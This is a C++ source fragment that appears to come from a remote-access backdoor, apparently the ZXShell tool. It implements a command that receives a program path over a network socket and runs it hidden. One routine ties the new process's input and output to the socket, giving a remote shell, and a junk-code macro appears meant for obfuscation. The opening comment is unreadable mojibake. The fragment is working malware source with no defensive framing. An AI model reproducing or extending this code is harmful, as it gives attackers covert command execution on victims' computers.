//����һ������

int Execute(SOCKET Socket,char *cmd)
{
	SPAMFUNCTION
		

	if(ZXSAPI::WinExec(cmd,SW_HIDE)>32) 
		SendMessage(Socket, "Execute The Command Successfully\r\n"); 
	else  
		//sprintf(Temp,"Fail To Execute The Command\r\n");
		err_display(Socket, "Execute", 1);

	return 1;
}

int DoExecute(SOCKET Socket, char *cmd)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si,0,sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;//
	si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)Socket;
	if(ZXSAPI::CreateProcess(NULL,cmd,NULL,NULL,TRUE,0,0,NULL,&si,&pi))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
	}
	return 1;
}

int Execute(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	if(argc < 2)
	{
		SendMessage(Socket, 
			"Usage: \r\n"
			"    %s File /wait\r\n"
			"Example: \r\n"
			"    %s C:\\a.exe\r\n"
			"    %s C:\\b.exe /wait (wait for it to terminate.)\r\n", 
			argv[0], 
			argv[0],
			argv[0]);
		return FALSE;
	}
	if(argc == 2)
		return Execute(Socket, argv[1]);
	else if(argc == 3)
	{
		if(!stricmp(argv[2], "/wait"))
			return DoExecute(Socket, argv[1]);
		else
			return Execute(Socket, argv[1]);
	}
	return TRUE;
}